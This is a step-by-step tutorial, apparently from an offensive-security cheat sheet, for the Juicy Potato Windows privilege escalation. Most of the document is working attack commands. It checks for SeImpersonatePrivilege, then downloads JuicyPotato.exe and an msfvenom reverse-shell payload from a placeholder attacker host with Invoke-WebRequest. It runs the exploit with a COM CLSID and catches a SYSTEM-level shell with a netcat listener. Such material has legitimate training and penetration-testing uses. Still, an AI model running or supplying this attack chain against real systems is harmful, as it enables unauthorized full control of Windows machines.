**Juicy Potato** is a privilege escalation technique that abuses the way Windows handles COM services and token impersonation. It allows a user with **SeImpersonatePrivilege** (often granted to service accounts) to spawn a process with SYSTEM privileges by hijacking a trusted service call. This method is especially effective on Windows systems vulnerable to **token kidnapping**.

---

## 1. Verify SeImpersonatePrivilege

Check if your current user has the required privilege.

```powershell
whoami /priv
```

Look for:

```
SeImpersonatePrivilege Enabled
```

If present, you can proceed with Juicy Potato.

---

## 2. Download Juicy Potato Executable

You’ll need the Juicy Potato binary (`JuicyPotato.exe`). You can find it on GitHub or trusted repositories.

Transfer it to the target Windows machine using SMB, HTTP, or other methods.

```bash
# Example using Python HTTP server
python3 -m http.server 8080
```

On Windows:

```powershell
Invoke-WebRequest -Uri "http://ATTACKER_IP:8080/JuicyPotato.exe" -OutFile "C:\Users\Public\JuicyPotato.exe"
```

---

## 3. Generate a Reverse Shell Payload

Create a payload using `msfvenom` that will be executed with SYSTEM privileges.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=YOUR_PORT -f exe -o revshell.exe
```

---

## 4. Transfer the Payload to the Target

Same method as before:

```powershell
Invoke-WebRequest -Uri "http://ATTACKER_IP:8080/revshell.exe" -OutFile "C:\Users\Public\revshell.exe"
```

---

## 5. Find a Suitable CLSID

Juicy Potato requires a CLSID of a COM service that can be hijacked. You can use known CLSIDs or scan for them using tools like `Potato.exe` or reference lists.

Example CLSID:

```
{e60687f7-01a1-40aa-86ac-db1cbf673334}
```

---

## 6. Execute Juicy Potato

Run Juicy Potato with the required parameters:

```cmd
JuicyPotato.exe -l 1337 -p C:\Users\Public\revshell.exe -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
```

- `-l`: Listening port for COM hijack
- `-p`: Path to your payload
- `-t *`: Use any token type
- `-c`: CLSID of the COM service

---

## 7. Catch the Reverse Shell

Start your listener on Kali:

```bash
nc -lvnp YOUR_PORT
```

Once Juicy Potato executes the payload, you should receive a SYSTEM-level shell.
